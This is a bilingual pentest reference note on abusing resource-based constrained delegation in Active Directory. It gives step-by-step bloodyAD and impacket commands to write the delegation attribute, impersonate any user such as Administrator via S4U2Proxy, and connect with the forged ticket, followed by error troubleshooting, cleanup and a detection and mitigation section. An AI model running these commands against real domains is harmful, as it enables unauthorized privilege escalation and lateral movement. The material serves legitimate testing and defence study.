---
title: RBCD — resource-based constrained delegation and S4U2Proxy
tags: [windows, active-directory, rbcd, kerberos, lateral-movement]
---

# RBCD: write on the computer, delegate with S4U2Proxy

**English** | [🇪🇸 Español](rbcd-s4u2proxy.md)

## 1. The primitive

*Resource-Based Constrained Delegation* is configured on the **resource object**, not on the delegating account: the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute holds a descriptor with the SIDs allowed to delegate against it.

If you hold `GenericAll` or `WriteProperty` on the computer object (or its OU), you can write that attribute and make an account you control (with an SPN) request a ticket **as any user** against that computer. No domain admin and no `SeEnableDelegationPrivilege` needed: that is the difference from classic delegation.

## 2. Requirements

- **Write** on the target computer object (`DC2$`, `WS01$`...).
- A controlled account **with an SPN**: `svc_sql`, a machine account (`addcomputer.py`) or a user you can add one to.
- That account's credentials and a reachable KDC.

Add the SPN if missing:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<svc>,CN=Users,DC=<domain>,DC=<tld>' servicePrincipalName -v 'mssqlsvc/<host>.<domain>'
```

## 3. Write the attribute

```bash
impacket-rbcd -delegate-from '<svc>' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> '<domain>/<user>:<password>'
```

With `bloodyAD`:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> add rbcd '<TARGET>$' '<svc>'
```

Verify:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<TARGET>,OU=Domain Controllers,DC=<domain>,DC=<tld>' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

## 4. Request the ticket as another user

```bash
impacket-getST -spn 'mssqlsvc/<host>.<domain>' -impersonate '<victim>' -dc-ip <DC_IP> \
  '<domain>/<svc>:<password>'
export KRB5CCNAME='<victim>@mssqlsvc_<host>.<domain>@<DOMAIN>.ccache'
impacket-mssqlclient -k -no-pass '<host>.<domain>'
```

The SPN must exist in the KDC and match the service you will use. `-impersonate` can be `Administrator`, a service account or any user whose SID the KDC can resolve.

## 5. Typical errors

- **`KDC_ERR_BADOPTION`** → the delegating account has no SPN, or the attribute has not replicated yet. Wait a few seconds and retry; check the SPN with `setspn -L`.
- **`The target account is not allowed to delegate`** → you wrote the attribute on a different object, or the target is a DC and the SPN points to a service not hosted there.
- **`KRB_AP_ERR_SKEW`** → clock; see [clock and Kerberos](../general/kerberos-clock.en.md).
- **`STATUS_NOT_SUPPORTED`** on write → the object is a system one; you need delegated `WriteProperty`, not just inherited `GenericAll`.
- **Valid ticket but no access** → the service checks group or IP; the ticket gives identity, not application permissions.

## 6. Cleanup

Clear `msDS-AllowedToActOnBehalfOfOtherIdentity` on the computer and drop the added SPN:

```bash
impacket-rbcd -delegate-from '<svc>' -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP> '<domain>/<user>:<password>'
```
`flush` writes an **empty** descriptor: it drops every ACE in the attribute, including pre-existing legitimate delegations. `remove` deletes only the specified principal's ACE.

## 7. Detection and mitigation

- **5136** on `msDS-AllowedToActOnBehalfOfOtherIdentity`, especially when written by a non-system admin.
- **4769** with `S4U2Proxy` and a `ServiceName` that is unusual for that account.
- **4624** type 3 on the target for a user who never connects there.
- Review `WriteProperty`/`GenericAll` on computer and OU objects; computers should not be able to write to other computers.
- Mark service accounts "sensitive and cannot be delegated" and audit added SPNs.

MITRE: T1550.003, T1134.001, T1558.
